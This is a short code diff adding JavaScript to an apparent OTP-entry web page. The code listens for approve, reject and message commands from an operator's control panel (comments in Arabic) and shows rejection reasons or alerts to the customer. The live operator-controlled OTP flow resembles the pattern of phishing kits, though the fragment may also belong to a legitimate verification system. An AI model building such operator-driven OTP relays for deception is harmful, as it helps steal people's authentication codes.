@@ -213,6 +213,21 @@
                 window.location.reload();
             }, 4000);
         });
+
+        // الاستماع لأوامر لوحة التحكم (توجيه / موافقة / رفض) أثناء تواجد العميل في هذه الصفحة
+        if (typeof window.listenForAdminCommands === 'function') {
+            window.listenForAdminCommands({
+                onApproval: function () {},
+                onRejection: function (cmd) {
+                    var why = (cmd && (cmd.reason || cmd.raw && cmd.raw.reason)) || 'يرجى المحاولة مرة أخرى';
+                    try {
+                        var errEl = document.getElementById('otpError');
+                        if (errEl) { errEl.textContent = 'تم رفض العملية: ' + why; errEl.style.display = 'block'; }
+                    } catch (e) {}
+                },
+                onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
+            });
+        }
 </script>
 </body>
 </html>
